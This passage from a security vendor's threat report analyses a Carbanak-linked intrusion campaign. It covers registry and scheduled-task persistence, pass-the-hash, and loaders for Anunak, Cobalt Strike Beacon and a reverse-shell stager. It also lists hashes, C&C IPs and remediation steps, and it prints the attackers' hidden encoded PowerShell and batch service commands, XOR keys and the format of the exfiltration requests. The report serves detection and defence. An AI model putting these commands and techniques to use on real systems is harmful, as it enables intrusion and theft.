\u2026  \n\nFigure 41.  TCP Reverse Shell from a PowerShell script\n\n23\n\nOperation Grand Mars: Defending Against Carbanak Cyber AttacksCopyright \u00a9 2017 Trustwave Holdings, Inc.\fThe final result of the above script is a memory resident malware providing reverse shell access to cybercriminals. \nAttackers have now successfully achieved persistence into the target infrastructure. The PowerShell command used \nto decode and execute this script along with the method of delivery has many similarities with \u201cPowerSploit - A \nPowerShell Post-Exploitation Framework\u201d and \u201cVeil Framework\u201d well known capable of Antivirus evasion of payloads. \n\nRegistry Autorun\n\nAdditionally, attackers have achieved persistence by utilizing the \u201cusual suspects\u201d also known as the operating \nsystem\u2019s startup locations. The following key is created in the registry to start the payload automatically after reboot.\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\TransbaseOdbcDriver\n\nFigure 42.  Registry persistence\n\nTask Scheduler\n\nFinally, a scheduled task has been created which is triggered every 30 minutes indefinitely. The name of the created \ntask is SysChecks and it executes the starter.vbs.\n\nFigure 43.  SysCheks Scheduled Task persistence\n\nEverything has been copied under the user temporary directory. \u201cC:\\Users\\<user profile>\\AppData\\Local\\Temp\u201d, \nwhich is also very common among malware operations because every user maintains full access within this  \nspecific directory.\n\n24\n\nOperation Grand Mars: Defending Against Carbanak Cyber AttacksCopyright \u00a9 2017 Trustwave Holdings, Inc.\fLATERAL MOVEMENT\n\nPass the Hash \n\nAnother consequence of the initial phase of this compromise is that attackers gained access to a local Windows OS \nadministrator account and then utilized pass-the-hash in order to steal credentials of a domain level, high privileged user.\n\nFigure 44.  Event showing Pass-the-Hash indicators\n\nEvent ID 4624 displayed above shows the use of a local account performing network logon (Logon Type:3) using a \nrandomized source computer name (Workstation Name: T5NMapiY4kGetJDe),  probably the result of an automated tool. \n\nPass the hash is a technique where attackers, after successfully taking control of a system, steal credential hashes \nthat are then used to perform authentication to other systems. This technique always benefits attackers especially if \nlocal accounts share the same password within the infrastructure. \n\nUltimately this allowed attackers to achieve domain or even enterprise admin access and gain network access by \nutilizing several resources as Command & Control points in Europe and US.\n\nFurther investigation of the attacked infrastructure showed that the intruders deployed similar PowerShell scripts or \nembedded batch files in order to spread within the environment. A large number of internal systems recorded events \nsimilar to the ones listed below:\n\n25\n\nOperation Grand Mars: Defending Against Carbanak Cyber AttacksCopyright \u00a9 2017 Trustwave Holdings, Inc. \n \n\fSource:        Service Control Manager\nDate:          09/11/2016 15:40:21\nEvent ID:      7045\nTask Category: None\nLevel:         Information\nKeywords:      Classic\nUser:            \nComputer:        \nDescription:\nThe description for Event ID 7045 from source Service Control Manager cannot be found. Either the \ncomponent that raises this event is not installed on your local computer or the installation is \ncorrupted. You can install or repair the component on the local computer.\n\nIf the event originated on another computer, the display information had to be saved with the \nevent.\n\nThe following information was included with the event: \n\nEdAeEJcGXdXJBHeX\n%COMSPEC% /C start %COMSPEC% /C \\WINDOWS\\Temp\\EyzxpCpBHlaNQvIb.bat\nuser mode service\ndemand start\nLocalSystem\n\nFigure 45.  Batch file used for spreading\n\nLog Name:      System\nSource:        Service Control Manager\nDate:          09/11/2016 19:31:29\nEvent ID:      7045\nTask Category: None\nLevel:         Information\nKeywords:      Classic\nUser:            \nComputer:        \nDescription: \nThe description for Event ID 7045 from source Service Control Manager cannot be found. Either the \ncomponent that raises this event is not installed on your local computer or the installation is \ncorrupted. You can install or repair the component on the local computer.\n\nIf the event originated on another computer, the display information had to be saved with the \nevent.\n\nThe following information was included with the event: \n\ndb57729\n%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPA-\nGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByA-\nG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEAQQBMADEAWAAvAFcALwBhA-\nFAAQgBEACsAdQBmAHcAVgAwAFYAUQBwAGkAVQBvAEoAVQBOAFoAMQBrAHkAYgBOAGYASQBjAEIAaABhAFoAUQBLAEUAUABJAEo-\nARQA1AHcANgA4AFEAMABkAGsAcgBwAHQAdgAvADkAdgBYAHoAUQBzA \n\u2026 \u2026 \u2026 \u2026  (truncated) \u2026 \u2026 \u2026 \u2026 \u2026\nvD89IRln4wgbO2pebAr8pjUMqHLXP6O3WJtV4qZv7e0pfsH\u2019),[IO.Compression.CompressionMode]::Decompress)),[T\next.Encoding]::ASCII)).ReadToEnd()\u201d\nuser mode service\ndemand start\nLocalSystem\n\nFigure 46.  PowerShell script used for spreading\n\nDuring this operation several PowerShell scripts were discovered similar to the initial one downloaded from Google \nDocs. The major difference among them was the C&C IP, which was one of several hosts located in Europe. \n\n26\n\nOperation Grand Mars: Defending Against Carbanak Cyber AttacksCopyright \u00a9 2017 Trustwave Holdings, Inc. \n \n \n \n     \n \n \n \n \n \n\fFURTHER MALICIOUS FILES\n\nA Forensics Timeline Analysis of file system activity around the same time and date as that of the \nTransbaseOdbcDriver.js and other companion files that were dropped into the user\u2019s Temp folder, revealed the \nfollowing suspicious executables/scripts:\n\n1.  AdobeUpdateManagementTool.vbs (connect to C&C and perform data exfiltration)\n\n2.  UVZHDVlZ.exe (variant of Carbanak)\n\n3.  Update.exe (Cobalt Strike\u2019s post-exploitation tool beacon)\n\n4.  322.exe (TCP reverse shell)\n\nAnalysis of these executables found them to be of a malicious nature and primarily designed to setup persistence or \ndata exfiltration. \n\nAdobeUpdateManagementTool.vbs\n\nMalicious script written in VBScript capable of receiving commands from the attacker to download and execute EXE files, \nVBScript or PowerShell script files. Exfiltrated data is sent to the attacker\u2019s IP addresses through HTTP POST tunnel. \n\nWhile the filename observed in our investigation was AdobeUpdateManagementTool.vbs it is common for attackers \nto use different file names in different campaigns. The hashes that identify this file uniquely (and useful in threat \ndetection and malware analysis) are: \n\nHash Type\n\nValue\n\nMD5\n\nSHA-1\n\nSHA256\n\nSSDeep\n\nCE7E9C3FB2872D4F500FED248228C3AC\n\nF040E484DA423540E0A398BAA57E00226A7689D9\n\nDDBF9963FE77ABDF97DE51A27509432ED963657D5F598E2179CEC882B0335334\n\n192:1/qgqjmQDJ35cnrS+vDa4j4Sdp/qgqjmQDJ35cnrS+vDa4j4Sd5:8g32pSnrpa84+Ig32pSnrpa84+5\n\nTable 5.  Hashes of AdobeUpdateManagementTool.vbs\n\nAdobeUpdateManagementTool.vbs, on execution, drops the following files after creating a folder  \n%AllUsersProfile% + \u201c\\Dropebox\u201d + <username> (for example: C:\\ProgramData\\DropeboxJoePC): \n\n\u2022  screenshot__.ps1: PowerShell script that takes a screenshot of the active desktop\n\n\u2022  screenshot__.png: Screenshot image captured by the PS script above is stored in this file\n\n\u2022  exe__.exe: Executable file sent by the attacker\n\n\u2022  vb__.vbs: VBscript sent by the attacker\n\n\u2022  ps1__.ps1: PowerShell script sent by the attacker\n\n\u2022  insatller.vbs: Updater VBS script sent by the attacker\n\nThis malicious script sends a specially crafted request to the attacker\u2019s Command & Control server and receives \nhashed (MD5) commands back from the server in response. These commands are then executed on the \ncompromised system. \n\n27\n\nOperation Grand Mars: Defending Against Carbanak Cyber AttacksCopyright \u00a9 2017 Trustwave Holdings, Inc.\fCommand in \nclear text\n\nDescription of the command\n\ninfo\n\nproc\n\nscrin\n\nexe\n\nvbs\n\nupdate\n\nps1\n\nGets system information and sends it to the C&C server via a HTTP POST request. \n\nEnumerates all running process.\n\nCaptures screenshot of the desktop image (this command first drops and executes the file \n\nscreenshot    ps1 and the image is saved to screenshot    .png. The image is then sent to the C&C \n\nserver through HTTP POST tunnel). \n\nAttacker sends this command with an accompanying executable file that is saved to exe    .exe. The \n\nexe file is transient for a very short period of time on the system before getting deleted. \n\nAttacker sends this command with an accompanying VBScript that is saved as vb .vbs. \nThe script is executed and the result returned is base64 encoded by the script and saved \nto a temporary file in Windows %temp% folder. The result is sent to the control server \nthrough HTTP POST tunnel (see exfiltration detail below). Both files result and script files \nare deleted after the execution. \n\nThe results file has the following text format: \n\ntype: vbs time: {current time} result: {output}\n\nProvides a VBScript updater along with this command. The updater script is saved to \nthe file insatller.vbs and then executed. The updater uninstalls its old version. This file, \nlike others, is only briefly present on the file system and is deleted 10 seconds after \nexecution.\n\nThe C&C server sends this command with an accompanying PowerShell script that is \nsaved to the file ps1    .ps. The script is executed and the results returned by the script \nare base64 encoded and saved to a temporary file in Windows %temp% folder. The \nresults are sent to the C&C server via a HTTP POST tunnel. Both files result and script \nfiles are deleted after the execution.\n\nThe results file has the following format: \n\ntype: ps1 time: {current time} result: {result details}\n\nTable 6.  Examples of supported commands\n\nThe resulting data upon execution of every command, is exfiltrated via a HTTP POST request to the C&C server as \nshown below: \n\nPOST /{random_name}.jsp?pId==={unique ID %md_id%}<<$>>{MD5 hash of Date & Time Now} <- encrypted in \nRC4 with hardcoded key. The POST parameters may also be iterated up to 3 times.\nUser-agent: Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC Pyramid Build/GRI40) AppleWebKit/533.1 \n(KHT ML, like Gecko) Version/4.0 Mobile Safari/533.1\nCharset:utf-8\nConnection: Keep-Alive\nKeep-Alive:300\nContent-Type: \u201cmultipart/form-data; boundary=\u201d{Random MD5 hash}\u201d\n\nFigure 47.  HTTP POST request used to exfiltrate data from compromised system\n\n28\n\nOperation Grand Mars: Defending Against Carbanak Cyber AttacksCopyright \u00a9 2017 Trustwave Holdings, Inc.\fThe HTTP POST uses the body format below:\n\n--{random MD5 hash}\nContent-Disposition: form-data; name=\u201d{random name}\u201d\n{unique ID and current Date/Time Hash - encrypted with RC4 and Base64}\n--{random MD5 hash}\nContent-Disposition: form-data; name=\u201d{random name}\u201d\npPar1c==={unique ID encrypted with RC4 and Base64}\n--{random MD5 hash}\nContent-Disposition: form-data; name=\u201d{random name}\u201d\npPar2c==={command\u2019s MD5 Hash encrypted with RC4 and Base64}\n--{random MD5 hash}\nContent-Disposition: form-data; name=\u201d{random name}\u201d\npPar3c==={Results/Data/StolenInformation encypted with RC4 and Base64}\n\nFigure 48.  HTTP POST method options\n\nThe script enters sleep mode for 3-5 minutes between each send \u201ccommand \u2013 exfiltrate results\u201d cycle before \nrunning again. \n\nThe following command and control servers were identified (it is trivial for attackers to keep changing their command \n& control servers so these IPs will most likely be different in other campaigns): \n\n\u2022  148.251.18.75\n\n\u2022  95.215.46.221\n\n\u2022  95.215.46.229\n\n\u2022  95.215.46.234\n\n\u2022  81.17.28.124\n\nThis file was not detected as malicious by ANY anti-virus tools as reported by VirusTotal. This is definitely a sign of \nsophistication of malware and that of the threat actors behind these attacks. \n\nUVZHDVlZ.exe\n\nThis file is a loader for the Anunak malware which is encrypted and embedded inside this executable. The payload \n(Anunak) executable then is injected to svchost.exe and provides backdoor capabilities for attackers to connect to \nand achieve persistent access to the compromised system. The file hashes associated with this executable are: \n\nHash Type\n\nValue\n\nMD5\n\nSHA-1\n\nSHA256\n\nSSDeep\n\nDD4F312C7E1C25564A8D00B0F3495E24\n\n499E162CF3A80673890BF7FC9FCBFA51B58DAF45\n\nDDAB9C2F975D336A698F4604AC755586C5451AC8DA0A98ECC5D9B8F6993D4E78\n\n6144:T3bX85EjXVQqUzbxHSFOrME+mcNUE27UB:PX85EjFXqZSAMocKc\n\nTable 7.  Hashes of UVZHDVlZ.exe\n\nInitially, the main executable decrypts two code modules embedded in its body using the XOR key \u201cPsdTsr8fer3\u201d \n(without the quotes): \n\n\u2022  The payload loader/process injector\n\n\u2022  The payload itself - Anunak malware Win32 executable\n\nThe decryption operation is as simple as the encryption, i.e. to XOR the code with the key, skipping every 3 bytes (we \nhave discovered the decryption routine used but have not reproduced the details in this report to maintain brevity). \n\n29\n\nOperation Grand Mars: Defending Against Carbanak Cyber AttacksCopyright \u00a9 2017 Trustwave Holdings, Inc.\fThe XOR key was identified after disassembling the executable and finding the instruction used to copy the XOR key \nto a heap to be used later for decrypting the loader and embedded executable (see below). \n\nFigure 49.  XOR key detection\n\nAs mentioned, the Anunak payload loader is decrypted first followed by decryption of the Anunak malware executable: \n\nFigure 50.  Payload decoding  \n\nFigure 51.  Starting Anunak after decrypting it\n\nThe following command and control servers were identified: \n\n\u2022  179..43.140.85 (port: 443) \n\n\u2022  107.181.246.189 (port: 443)\n\nThe execution flow of this malware may be visualized (using the Procdot tool [6]) as follows:\n\nFigure 52.  Procdot visualization of UVZHDVIZ.exe.\n\nInterestingly, uvzhdviz.exe is signed using a valid digital certificate issued by a Comodo CA, and appears to have \nbeen purchased by providing possibly forged identity information of a company based in Moscow, Russia. \n\n30\n\nOperation Grand Mars: Defending Against Carbanak Cyber AttacksCopyright \u00a9 2017 Trustwave Holdings, Inc. \n\fFigure 53.  Digital certificate details of UVZHDVIZ.exe (Grand Mars)\n\nUVZHDVlZ.exe was not detected as malicious by ANY anti-virus tools as reported on VirusTotal. This is another \nindicator of expertly crafted malware and sophistication of the attackers behind this campaign.\n\nUpdate.exe \n\nThis executable, like the Anunak loader executable described in the analysis in the previous section, is also signed \nusing a digital certificate issued by Comodo CA and purchased mere weeks before the malware campaign that is \nthe subject of this report. As with the other certificate used to sign the Anunak loader executable, this certificate was \nalso issued using the details, probably fake, of a company based in Moscow, Russia. \n\nHash Type\n\nValue\n\nMD5\n\nSHA-1\n\nSHA256\n\nSSDeep\n\nBACE8F2B09C2BFAB35ED9ED98B2E1B83\n\n188D751B7530DB668B88BDB96EDA50A08C119850\n\n321BA0DFFEE63518BFE24FF02C0DF6A09692A5D32BCC33AA454AC7431D390F57\n\n6144:T3bX85EjXVQqUzbxHSFOrME+mcNUE27UB:PX85EjFXqZSAMocKc\n\nTable 8.  Hashes of Update.exe\n\n31\n\nOperation Grand Mars: Defending Against Carbanak Cyber AttacksCopyright \u00a9 2017 Trustwave Holdings, Inc. \n\fFigure 54.  Digital certificate details of update.exe\n\nThis executable file is actually a loader that creates a new thread of Cobalt Strike\u2019s post-exploitation tool called \nBeacon. The Beacon DLL is encrypted and embedded in the malware body.\n\nInitially, the main executable decrypts two code modules embedded in its body:\n\n\u2022  Loader Code (itself)\n\n\u2022  Payload PE File (embedded in its body)\n\nAs with the Anunak loader executable described in the previous section, this file also uses XOR with the following \nkey \u201ckeDx8\u201d (without the quotes) identified during the analysis of the disassembled code for both encryption and \ndecryption operations for both the loader code and the embedded PE executable. The figure below shows the \ndisassembled code for decrypting the XORed code. \n\nFigure 55.  Decryption routine with XOR key\n\n32\n\nOperation Grand Mars: Defending Against Carbanak Cyber AttacksCopyright \u00a9 2017 Trustwave Holdings, Inc.\fThe figures below show the encrypted/decrypted loader and PE executable (payload): \n\nFirst the loader code: \n\nFigure 56.  Loader Code\n\nThen the payload PE executable file: \n\nFigure 57.  PE Executable\n\nAfter successfully decrypting the payload executable, the payload is executed in memory. \n\nWhen the payload is executed, it first allocates memory where it will hold the decrypted beacon DLL.\n\nFigure 58.  Memory allocation for payload\n\nIt will then decrypt the DLL file. This is once again done by XORing the encrypted DLL against a block of seemingly \nrandom keys.\n\nFigure 59:  Routine to decrypt beacon DLL\n\nFigure 60.  Decrypted beacon DLL\n\nIt will then load the DLL to a new thread. The beacon is compiled as a reflective DLL [7]. This allows various payload \nstagers and the stage less artifacts to inject beacon into memory.\n\n33\n\nOperation Grand Mars: Defending Against Carbanak Cyber AttacksCopyright \u00a9 2017 Trustwave Holdings, Inc. \n\fFigure 61.  Reflective beacon DLL\n\nThe beacon DLL loops indefinitely and sleeps for 10 secs between each loop iteration. \n\nThis executable implements a technique to detect the presence of malware detection/AV tools on the compromised \nsystem and/or the network. It connects externally and downloads from a hardcoded host the EICAR Anti-Malware \ntest string. This text is a special \u2018dummy\u2019 string for testing security controls such AV software, IDS etc. This is an \nindication to the malware that there are no AV tools on the compromised system. \n\nThe following command and control servers was used: \n\n\u2022  95.215.44.12 (HTTP)\n\nFigure 62.  EICAR test string in X-Malware field\n\nThis executable file was not detected as malicious by ANY anti-virus tools as reported by VirusTotal as of date of \nwriting this report.  \n\n322.exe \n\nThe role of this executable named 322.exe, upon analysis, was found to establish persistent access to the \ncompromised system using a TCP reverse connect backdoor. \n\nThe file hashes are provided in the table below: \n\nHash Type\n\nValue\n\nMD5\n\nSHA-1\n\nSHA256\n\nSSDeep\n\n5F73BEB23C45006AD952A71FA62C6F9F\n\n14F5092E2E25EC5479FF5E0F7515A6F17674A845\n\n191BDA73661A99E7F2FBE746F4D6105076F1E5A690B124D5F381E218626CA1C2\n\n192:jgm5OgVo4KCobo7y/+KDRSe5fOw81j5NkDQ23C+xan9xpNhhwZhf9UVF8:H1JKCobou/+KtSLjoD5nqxIDf9UVO\n\nTable 9.  Hashes of 322.exe\n\nThis executable checks for an AV process on the infected system and based on what it finds, either executes a new \nprocess \u201cwuauclt.exe\u201d (if AV found), or \u201csvchost.exe -k netsvcs\u201d. If it is unable to execute the previous command, it \nspawns explorer.exe.  \n\n34\n\nOperation Grand Mars: Defending Against Carbanak Cyber AttacksCopyright \u00a9 2017 Trustwave Holdings, Inc.\fOn analysis of the disassembled executable code, this malware was found to accept the following three command \nline arguments: {transport} {LHOST} {LPORT}\n\nFor example: 322.exe 4 127.0.0.1 53\n\nIt was also found that the {transport} option can have the following valid values: \n\n(transport} option\n\nInterpretation\n\n0\n\n3\n\n4\n\nreverse_tcp_connect with no payload encryption\n\nsimple bind_tcp shell\n\nreverse_tcp_connect with encrypted payload\n\nTable 10.  Valid {transport} command line options for 322.exe\n\nWhen the executable is run with one of the three valid options in the table above (along with the correct IP:port \ncombination), it receives a DLL payload from the IP, and injects it reflectively [7] to the process it successfully \nspawned (wuauclt.exe or svchost.exe or explorer.exe). It then transfers the execution to that process. This in turn \nprovides the attackers with one of the three types of command shell access to the compromised system.  \n\nIt\u2019s not the first time that cybercriminals have utilized well-known tools since the executable is nothing more than a \ncustomized Metasploit stager responsible for downloading and executing the reverse TCP. The final step of 322.exe \nis to delete itself from the file system in order to leave no trace behind.\n\nVirusTotal score for this malware executable was 8/57 as of last analysis. The low score, combined with the findings \nof the analysis of the file is indicative of a high level of sophistication on the part of the malware authors in being \nable to effectively evade a majority of the AV tools.\n\n35\n\nOperation Grand Mars: Defending Against Carbanak Cyber AttacksCopyright \u00a9 2017 Trustwave Holdings, Inc. \n\fConclusions\n\nDuring the investigations of several malicious executables, obfuscated PowerShell commands and scripts of Visual \nBasic and JavaScript were discovered as listed in Appendix A. Some of the executables after being downloaded by \ntheir parent process were written directly into memory and then reflectively injected [7] into other processes as DLLs \nand  were deleted after performing their role. Likewise, the extended usage of PowerShell commands gives the \nadvantage to adversaries of \u201cdiskless\u201d aka \u201cmemory resident malware\u201d hidden behind the process of their scripting \nhost. Also the practice of utilizing scripts which are flexible by nature is another strong advantage to attackers \nallowing them to effortlessly modify their code.\n\nAdditionally, the use of so many different types of malicious software strongly indicates that several entities are \ncooperating and communicating in the underground markets to exchange tools and techniques. It is also possible \nthat some of the attack\u2019s stages have been performed by different malicious groups of people and then other groups \nhave carried on. \n\nLikewise, the number of network hosts used globally as extraction points or Command & Control Servers is another \nindicator of organized crime operations. Their location and role is depicted below in the European region map (note: \nThree servers located in N. America not shown for simplicity).\n\nFigure 63.  Malicious hosts geolocation \n\nThe fact that someone purchased and used legitimate digital certificates issued from a reputable CA (Comodo) \nusing valid or probably fake identities, of Russian origin with details in Moscow, (Grand Mars and Forsajt Ynvest) is \nanother piece of circumstantial evidence pointing to the involvement of organized cybercrime network with strong \nmotivation to these attacks.\n\n36\n\nOperation Grand Mars: Defending Against Carbanak Cyber AttacksCopyright \u00a9 2017 Trustwave Holdings, Inc.\fThe proximity of the signature timestamps (indirectly its creation date) to the timeline of attacks suggests strongly \nthat the actors purchased these certificates specifically for use in this operation. Had these digital certificates been \nstolen or \u201cborrowed\u201d from a valid company, it is unlikely for there to have been such strong correlation between the \ntimeline of the attacks and the date/time that the certificates were generated by the CA. \n\nFurthermore, the Pastebin URL used in the attacks as part of the command & control mechanism by the attackers \nbelongs to an individual identified as \u201cShtokov\u201d. This is yet another (weak) indication of the involvement of Russian/\nEastern European actors in these attacks. \n\nFigure 64.  Shtokov Pastebin site used in Command and Control\n\nUsing services such as Google Docs in order to keep track of victims and spreading malicious files becomes a very \nbig challenge for defenders because this way is very difficult to distinguish between good and bad guys using these \npopular public cloud services. \n\nFinally, the attack characteristics of this family of malware share several common traits with the, original, well \nunderstood Carbanak APT campaign, which has been positively attributed to the Russian underground financial \ncybercrime network. \n\nThe only thing that we can be sure is that attackers will not stop seeking new and innovative ways of infecting \ncorporate environments and manipulating public services, which are considered loyal and trustworthy from  \nthe public.  \n\n37\n\nOperation Grand Mars: Defending Against Carbanak Cyber AttacksCopyright \u00a9 2017 Trustwave Holdings, Inc.\fRemediation\n\nBased on the findings of our investigation across several cases now dubbed to be part of the \u201cGrand Mars\u201d  \nAPT campaign, Trustwave SpiderLabs recommends the following remedial measures to be put in place both to \neffectively negate or minimize the damage caused due to the attacks, and to proactively address the threat prior to \nits realization.\n\nTACTICAL (SHORT TO MEDIUM TERM) COUNTERMEASURES \n\n\u2022  Regular security awareness trainings for all personnel.\n\n\u2022  Disable execution of VBS/VBE/macros from Internet based documents. \n\n\u2022  Prohibit execution of files (EXE, VBS etc.) from folders such as AppData, User\u2019s Temp.\n\n\u2022  Disable full unrestricted Internet access where not required.\n\n\u2022  Minimize the number and usage of administrator accounts.\n\n\u2022  Prevent regular users from logging in as administrators.\n\n\u2022  Implement application layer filtering for widely used protocols such as HTTP etc.\n\n\u2022  Create unique passwords for local user and administrators and change them frequently.\n\n\u2022  Limit administrative access only to those systems required.\n\nSince the malware is primarily memory resident, with no disk or file-system level changes made to the host system, \nthe following checks are recommended to be carried out on all endpoints, servers, and the network. We recommend \nto check for indicators of:\n\n\u2022  Service(s) with randomized names installed and started on the system\n\n\u2022  Service(s) executed from:\n\n\u2022  A PowerShell command/script\n\n\u2022  A suspicious/randomized command, program or binary of unknown origin and purpose  \n\n(such as Update.exe/322.exe noted in our report).\n\n\u2022  A batch (.bat) script with a randomized name \n\n\u2022  Systems making (or attempting to make) network connections to an external IP, especially on common ports \n\nsuch as 110, 53, 80, 443, 8080 commonly allowed on firewalls for outbound connections but without using the \nactual protocols for these ports.\n\n\u2022  Scheduled tasks and OS Autoruns locations.\n\nFor a full list of IP addresses and malicious hosts/domains contacted by the malware in this report, please review \nthe Table of IOCs at the end of this section. \n\nKEY INDUSTRIES BE AWARE\n\nIt is highly recommended that organizations within the retail, e-commerce and hospitality industries implement \nstrategic countermeasures immediately. Undertake a thorough compromise assessment proactively rather than \nwait for the first signs of attack. Perform a comprehensive threat hunt, using information from this Advanced Threat \nReport, across the network, including servers and endpoints, to identify any signs of malicious activity. Finally, \nevaluate your current incident response capability to identify gaps that affect your organizations ability to respond. \nNo organization can deliver protection against all attacks. But your ability to effectively disrupt an attack, and \nrespond quickly and effectively, will have a long-term impact on your survivability in the face of advanced attacks \nlike Grand Mars.\n\n38\n\nOperation Grand Mars: Defending Against Carbanak Cyber AttacksCopyright \u00a9 2017 Trustwave Holdings, Inc. \n\fAppendix A: Files\n\nFile name\n\nHash (SHA256)\n\n1-list.docx\n\n803009B5CF8D663A2FA3E20651CBDD57DA25908366D886C2EEBC1A4BF7DFC3F0\n\noleObject1.bin\n\nEC3980961C6145C96C1220188C6C06AC192AB4B5C4B2E335A96715DE43C62FDB\n\ndttsg.txt\n\n22F59C3CDABCECF9F71826D1BCE84FE227462142A437E76DC43046DBC63CE1E8\n\nLanCradDriver.ini\n\nDEA485D817D712A5B61A8F31123F914890183D2F9B0BF0F3AF89366085596D5D\n\nLanCradDriver.vbs\n\n7683A9760AED259636C8623B577446406FF22E478CC33FA3095F681F54C2AF3B\n\nstarter.vbs\n\n270A776CB9855F27452B35F072AFFBBC65023D4BB1F22E0C301AFD2276E7C5EA\n\nTransbaseOdbcDriver.js\n\n313E38756B80755078855FE0F1FFEA2EA0D47DFFFCBE2D687AAA8BDB37C892F4\n\nUVZHDVlZ.exe\n\nDDAB9C2F975D336A698F4604AC755586C5451AC8DA0A98ECC5D9B8F6993D4E78\n\nUVZHDVlZPVBfXFBeVA.bin\n\nB84C629AC6AB3F8E03D8A52E8D3E874634C1645154C310F18B8F9FBB9D26BA41\n\n322.exe\n\n191BDA73661A99E7F2FBE746F4D6105076F1E5A690B124D5F381E218626CA1C2\n\nAdobeUpdateManagementTool.\nvbs \n\nDDBF9963FE77ABDF97DE51A27509432ED963657D5F598E2179CEC882B0335334\n\nupdate.exe\n\n321BA0DFFEE63518BFE24FF02C0DF6A09692A5D32BCC33AA454AC7431D390F57\n\n1.bat\n\nstr.vbs\n\nBB0DF2ACCC9F34F432AD7A6279003EF4283508F20BDA005605B1245D0D5164A6\n\nEA82AD136A0964EA6E1EC30288BD0D6E41E8AEC2D0206D802BCE7429A8DD69BF\n\nvbssysteminstall.vbs\n\nB9D6CE9A1DBBD4888F58FC1B3732EF7FE17B00319103AD965237327908D0D254\n\nresolv_ip.vbs\n\n7AFE9EA1E8A6398E9C3BA4CAA0EEF788D80B6C07235558D23FDC818E3F9E9F6E\n\n\\Windows\\temp\\vb__.vbs\n\nE9F7E0BE49BF2B3A276A664A57FEE4459B77964F1F3BEAE80BC461634BC2A6AF\n\nTable 11.  File IOCs for the Grand Mars APT\n\nComments\n\nEmail word \nattachment\n\nEncrypted vbs from \ndocx (unprotected.\nvbe)\n\nData copied from \npastebin\n\nPS1 script \ndownloaded from \nGoogle Docs\n\nCaller for \nLanCradDriver.ini\n\nScheduled task \n(SysChecks) calling \nTransbaseOdbc-\nDriver.js\n\nGoogle Docs \n+ Pastebin \ncommunicator\n\nCarbanak, signed \nfile with Comodo \ncertificate\n\nConfig file for \nprevious exe\n\nReflectively injecting \ndll for reverse shell\n\nCommunicating with \nvarious C&C\n\nCobalt Strike's \npost-exploitation \ntool called Beacon, \nsigned file with \nComodo certificate\n\nBatch file with PS1 \nscripts\n\nEncoded PS scripts \n(32/64-bit), download \nXOR-encrypted \npayload to RAM\n\nVBS installed Adobe-\nUpdateManagement-\nTool as a service\n\nVBS reading \nhostnames from \nhostnames.txt and \npings them\n\nEncoded PS scripts \n(32/64-bit), download \nXOR-encrypted \npayload to RAM\n\n39\n\nOperation Grand Mars: Defending Against Carbanak Cyber AttacksCopyright \u00a9 2017 Trustwave Holdings, Inc. \n\fAppendix B: Malicious hosts/IP addresses\n\nHost\n\nUsage\n\n62.210.25.121\n\nReverse shell metepreter (port 80)\n\n80.84.49.61\n\n80.84.49.66\n\n81.17.28.124\n\n89.163.248.8\n\n89.163.248.6\n\n95.215.44.12\n\n95.215.46.221\n\n95.215.46.229\n\n95.215.46.234\n\n95.215.46.249\n\n95.215.44.94\n\n95.215.47.105\n\n104.250.138.197\n\n107.181.246.189\n\n148.251.18.75\n\n179.43.140.85\n\n179.43.133.34\n\n192.99.14.211\n\n212.129.36.175\n\nReverse shell metepreter (port 53)\n\nVBS script C&C\n\nAdobeUpdateManagementTool.vbs\n\nReverse shell metepreter\n\nReverse shell metepreter\n\nCobalt Strike's Beacon \n\nAdobeUpdateManagementTool.vbs\n\nAdobeUpdateManagementTool.vbs\n\nAdobeUpdateManagementTool.vbs\n\nAdobeUpdateManagementTool.vbs\n\nsvchost.exe\n\nHosting AdobeUpdateManagementTool.vbs \n\nsvchost.exe\n\nCarbanak C&C (port 443)\n\nAdobeUpdateManagementTool.vbs\n\nCarbanak C&C (port 443)\n\nAdobeUpdateManagementTool.vbs\n\nCarbanak C&C\n\nPowerShell C&C \n\nGeo Location\n\nFrance\n\nUK\n\nUnited Kingdom\n\nSwitzerland\n\nGermany\n\nGermany\n\nSweden\n\nSweden\n\nSweden\n\nSweden\n\nSweden\n\nSweden\n\nSweden\n\nUnited States\n\nUnited States\n\nGermany\n\nSwitzerland\n\nSwitzerland\n\nCanada\n\nFrance\n\nTable 12.  Malicious hosts and IPs\n\nReferences\n\n1.  Metasploit \n\n2.  PowerSploit \n\n https://www.metasploit.com/ \n\n https://github.com/PowerShellMafia/PowerSploit \n\n3.  Veil Framework \n\n https://www.veil-framework.com/  \n\n4.  Office File Formats \n\n https://msdn.microsoft.com/en-us/library/office/cc313118(v=office.12).aspx \n\n5.  Script Encryptor \n\n http://www.dennisbabkin.com/screnc/ \n\n6.  Procdot Tool \n\n http://www.procdot.com/ \n\n7.  Reflective DLL Injection \n\n http://www.harmonysecurity.com/files/HS-P005_ReflectiveDllInjection.pdf \n\n40\n\nOperation Grand Mars: Defending Against Carbanak Cyber AttacksCopyright \u00a9 2017 Trustwave Holdings, Inc.\fList of Figures\n\nFigure 1 . Email received by victim with a Word attachment  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . . 3\n\nFigure 2 . Message body of the suspect email  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . . 3\n\nFigure 3 . Microsoft Word  .docx attachment (1-list .docx)  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . . 3\n\nFigure 4 . Word  .docx Macro enabled malware  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 4\n\nFigure 5 . Embedded oleObject0 .bin file from Word document  .  .  .  .  .  .  .  .  